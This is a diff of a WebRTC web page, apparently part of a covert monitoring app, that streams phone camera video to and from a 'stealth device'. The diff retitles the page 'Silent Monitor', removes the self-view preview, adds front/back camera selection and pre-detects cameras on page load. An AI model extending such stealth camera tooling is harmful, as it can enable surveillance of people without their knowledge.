@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Remote - Dual Camera View</title>
+    <title>Astro Remote - Silent Monitor</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -67,6 +67,7 @@
             cursor: pointer; flex: 1; font-family: monospace;
         }
         .camera-btn:active { transform: scale(0.97); }
+        .camera-btn:disabled { opacity: 0.4; }
         .camera-btn.active { background: #ffd700; color: #1a1a2e; }
         .call-btn.end { background: #5a1e1e; border-color: #ff6b6b; color: #ff6b6b; }
         .call-btn:disabled { opacity: 0.4; }
@@ -75,12 +76,9 @@
         .video-wrapper {
             position: relative; background: #1a1a2e;
             border-radius: 15px; overflow: hidden; border: 1px solid #ffd700;
-            margin-bottom: 10px;
         }
-        .video-wrapper:last-child { margin-bottom: 0; }
-        video { width: 100%; max-height: 250px; background: #000; display: block; }
+        video { width: 100%; max-height: 300px; background: #000; display: block; }
         #remoteVideo { width: 100%; }
-        #localPreview { width: 100%; transform: scaleX(-1); }
         .video-label {
             position: absolute; bottom: 6px; left: 6px;
             background: rgba(0,0,0,0.7); color: #ffd700;
@@ -135,10 +133,6 @@
         <div class="call-status" id="callStatus">⚫ Standby</div>
         <div class="video-container" id="videoContainer">
             <div class="video-wrapper">
-                <video id="localPreview" autoplay muted playsinline></video>
-                <span class="video-label">📡 Remote Camera (muted)</span>
-            </div>
-            <div class="video-wrapper">
                 <video id="remoteVideo" autoplay playsinline></video>
                 <span class="video-label">👁️ Stealth Feed</span>
             </div>
@@ -167,6 +161,11 @@
         let currentCamera = 'front';
         let isVideoMode = false;
         let keepAliveInterval = null;
+        
+        // Camera device IDs
+        let frontCameraId = null;
+        let backCameraId = null;
+        let cameraDetectionDone = false;
 
         const connectBtn    = document.getElementById('connectBtn');
         const audioOnlyBtn  = document.getElementById('audioOnlyBtn');
@@ -179,7 +178,178 @@
         const callStatus    = document.getElementById('callStatus');
         const videoContainer = document.getElementById('videoContainer');
         const remoteVideo   = document.getElementById('remoteVideo');
-        const localPreview  = document.getElementById('localPreview');
+
+        // Detect cameras and get their device IDs
+        async function detectCameras() {
+            try {
+                // Request permission first
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(d => d.kind === "videoinput");
+                
+                console.log(`[REMOTE] Found ${cameras.length} cameras:`);
+                cameras.forEach((cam, i) => {
+                    console.log(`  Camera ${i + 1}: ${cam.label || 'Unnamed'} - ID: ${cam.deviceId.substring(0, 20)}...`);
+                });
+                
+                // Identify front and back cameras by label
+                for (const cam of cameras) {
+                    const label = cam.label.toLowerCase();
+                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
+                        backCameraId = cam.deviceId;
+                        console.log(`[REMOTE] Identified BACK camera: ${cam.label}`);
+                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
+                        frontCameraId = cam.deviceId;
+                        console.log(`[REMOTE] Identified FRONT camera: ${cam.label}`);
+                    }
+                }
+                
+                // Fallback: if labels don't help, assume first is front, second is back
+                if (!frontCameraId && cameras[0]) {
+                    frontCameraId = cameras[0].deviceId;
+                    console.log(`[REMOTE] Using first camera as FRONT`);
+                }
+                if (!backCameraId && cameras[1]) {
+                    backCameraId = cameras[1].deviceId;
+                    console.log(`[REMOTE] Using second camera as BACK`);
+                }
+                
+                cameraDetectionDone = true;
+                
+                if (frontCameraId) {
+                    console.log(`[REMOTE] Front camera ID: ${frontCameraId.substring(0, 20)}...`);
+                }
+                if (backCameraId) {
+                    console.log(`[REMOTE] Back camera ID: ${backCameraId.substring(0, 20)}...`);
+                }
+                
+            } catch (err) {
+                console.warn(`[REMOTE] Camera detection failed: ${err.message}`);
+                cameraDetectionDone = false;
+            }
+        }
+
+        // Get camera stream using deviceId (most reliable method)
+        async function getRemoteCameraStream(useBackCamera) {
+            // Stop old stream first
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Ensure we have camera IDs
+            if (!cameraDetectionDone) {
+                await detectCameras();
+            }
+            
+            const targetDeviceId = useBackCamera ? backCameraId : frontCameraId;
+            
+            // Method 1: Use exact deviceId if available
+            if (targetDeviceId) {
+                try {
+                    console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with deviceId`);
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        audio: false,
+                        video: {
+                            deviceId: { exact: targetDeviceId },
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        }
+                    });
+                    
+                    const videoTrack = stream.getVideoTracks()[0];
+                    const settings = videoTrack.getSettings();
+                    console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via deviceId`);
+                    console.log(`[REMOTE] Camera settings:`, settings);
+                    
+                    return stream;
+                    
+                } catch (err) {
+                    console.warn(`[REMOTE] deviceId method failed: ${err.message}`);
+                }
+            }
+            
+            // Method 2: Use facingMode with exact constraint
+            try {
+                console.log(`[REMOTE] Trying ${useBackCamera ? 'BACK' : 'FRONT'} camera with exact facingMode`);
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: {
+                        facingMode: { exact: useBackCamera ? "environment" : "user" },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                const videoTrack = stream.getVideoTracks()[0];
+                const settings = videoTrack.getSettings();
+                console.log(`[REMOTE] ${useBackCamera ? 'BACK' : 'FRONT'} camera acquired via facingMode`);
+                console.log(`[REMOTE] Camera settings:`, settings);
+                
+                return stream;
+                
+            } catch (err) {
+                console.warn(`[REMOTE] Exact facingMode failed: ${err.message}`);
+            }
+            
+            // Method 3: Fallback to any camera
+            console.log(`[REMOTE] Falling back to default camera`);
+            return await navigator.mediaDevices.getUserMedia({
+                audio: false,
+                video: { width: { ideal: 640 }, height: { ideal: 480 } }
+            });
+        }
+
+        // Switch remote's own camera
+        async function switchRemoteCamera(targetCamera) {
+            if (!isVideoMode || !mediaCall) {
+                callStatus.innerText = '⚠️ Start video monitor first';
+                return;
+            }
+            if (targetCamera === currentCamera) return;
+            
+            const useBackCamera = (targetCamera === 'back');
+            callStatus.innerText = `🔄 Switching to ${targetCamera} camera...`;
+            
+            try {
+                const newStream = await getRemoteCameraStream(useBackCamera);
+                
+                if (mediaCall.peerConnection) {
+                    const senders = mediaCall.peerConnection.getSenders();
+                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+                    if (videoSender && newStream.getVideoTracks()[0]) {
+                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
+                        console.log(`[REMOTE] Video track replaced successfully`);
+                    }
+                }
+                
+                localStream = newStream;
+                currentCamera = targetCamera;
+                
+                frontCameraBtn.classList.toggle('active', currentCamera === 'front');
+                backCameraBtn.classList.toggle('active', currentCamera === 'back');
+                
+                // Log actual camera being used
+                const videoTrack = localStream.getVideoTracks()[0];
+                if (videoTrack) {
+                    const settings = videoTrack.getSettings();
+                    console.log(`[REMOTE] Active camera settings:`, settings);
+                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE (${settings.facingMode || 'unknown'})`;
+                } else {
+                    callStatus.innerText = `📹 Remote ${currentCamera} camera ACTIVE`;
+                }
+                
+                setTimeout(() => {
+                    if (callStatus.innerText.includes('Switching')) {
+                        callStatus.innerText = `👁️ ${isVideoMode ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
+                    }
+                }, 2000);
+                
+            } catch (err) {
+                console.error(`[REMOTE] Camera switch failed:`, err);
+                callStatus.innerText = `❌ Camera switch failed: ${err.message}`;
+            }
+        }
 
         // Prevent screen lock
         function preventScreenLock() {
@@ -189,9 +359,7 @@
                     try {
                         wakeLock = await navigator.wakeLock.request('screen');
                         console.log('[REMOTE] Screen wake lock acquired');
-                    } catch (err) {
-                        console.log(`Wake lock error: ${err.message}`);
-                    }
+                    } catch (err) {}
                 };
                 requestWakeLock();
                 document.addEventListener('visibilitychange', () => {
@@ -232,66 +400,6 @@
             }
         }
 
-        // Get remote's own camera stream (NO audio)
-        async function getRemoteCameraStream(useBackCamera) {
-            const constraints = {
-                audio: false,
-                video: {
-                    facingMode: useBackCamera ? "environment" : "user",
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                }
-            };
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                console.log(`[REMOTE] ${useBackCamera ? 'Back' : 'Front'} camera acquired`);
-                return stream;
-            } catch (e) {
-                console.warn(`Camera error: ${e.message}`);
-                // Fallback without exact facingMode
-                const fallback = {
-                    audio: false,
-                    video: { width: { ideal: 640 }, height: { ideal: 480 } }
-                };
-                return await navigator.mediaDevices.getUserMedia(fallback);
-            }
-        }
-
-        // Switch remote's own camera
-        async function switchRemoteCamera(targetCamera) {
-            if (!isVideoMode || !mediaCall) return;
-            if (targetCamera === currentCamera) return;
-            
-            const useBackCamera = (targetCamera === 'back');
-            callStatus.innerText = `🔄 Switching remote to ${targetCamera} camera...`;
-            
-            try {
-                const newStream = await getRemoteCameraStream(useBackCamera);
-                
-                if (mediaCall.peerConnection) {
-                    const senders = mediaCall.peerConnection.getSenders();
-                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
-                    if (videoSender && newStream.getVideoTracks()[0]) {
-                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
-                    }
-                }
-                
-                if (localStream) localStream.getTracks().forEach(t => t.stop());
-                localStream = newStream;
-                currentCamera = targetCamera;
-                localPreview.srcObject = newStream;
-                
-                frontCameraBtn.classList.toggle('active', currentCamera === 'front');
-                backCameraBtn.classList.toggle('active', currentCamera === 'back');
-                
-                callStatus.innerText = `📹 Remote ${currentCamera === 'front' ? 'Front' : 'Back'} camera ACTIVE`;
-            } catch (err) {
-                callStatus.innerText = `❌ Camera switch failed`;
-                console.error(err);
-            }
-        }
-
         async function makeSilentAudioStream() {
             try {
                 return await navigator.mediaDevices.getUserMedia({ audio: false, video: false });
@@ -313,13 +421,23 @@
                 let streamToSend = null;
                 
                 if (withVideo) {
+                    // Detect cameras first
+                    await detectCameras();
+                    
                     streamToSend = await getRemoteCameraStream(false);
+                    localStream = streamToSend;
                     currentCamera = 'front';
-                    localPreview.srcObject = streamToSend;
                     videoContainer.classList.add('active');
                     cameraControls.style.display = 'flex';
                     frontCameraBtn.classList.add('active');
                     backCameraBtn.classList.remove('active');
+                    
+                    // Log camera info
+                    const videoTrack = localStream.getVideoTracks()[0];
+                    if (videoTrack) {
+                        const settings = videoTrack.getSettings();
+                        console.log(`[REMOTE] Initial camera settings:`, settings);
+                    }
                 } else {
                     streamToSend = await makeSilentAudioStream();
                     cameraControls.style.display = 'none';
@@ -351,6 +469,7 @@
                 mediaCall.on('error', (err) => { endCall(); });
 
             } catch (err) {
+                console.error('[REMOTE] Start call error:', err);
                 callStatus.innerText = '❌ Failed to start monitor';
                 endCall();
             }
@@ -365,7 +484,6 @@
                 mediaCall.close(); 
                 mediaCall = null; 
             }
-            localPreview.srcObject = null;
             remoteVideo.srcObject = null;
             videoContainer.classList.remove('active');
             cameraControls.style.display = 'none';
@@ -397,7 +515,7 @@
             const connection = peer.connect(PARTNER_ID);
             
             connection.on('open', () => {
-                console.log('[REMOTE] Connected');
+                console.log('[REMOTE] Connected to stealth');
                 callStatus.innerText = '✅ Connected to stealth device!';
                 setupConnection(connection);
             });
@@ -418,6 +536,11 @@
             });
             
             preventScreenLock();
+            
+            // Pre-detect cameras on page load
+            navigator.mediaDevices.enumerateDevices().then(() => {
+                detectCameras();
+            });
         }
 
         connectBtn.addEventListener('click', connectToPartner);
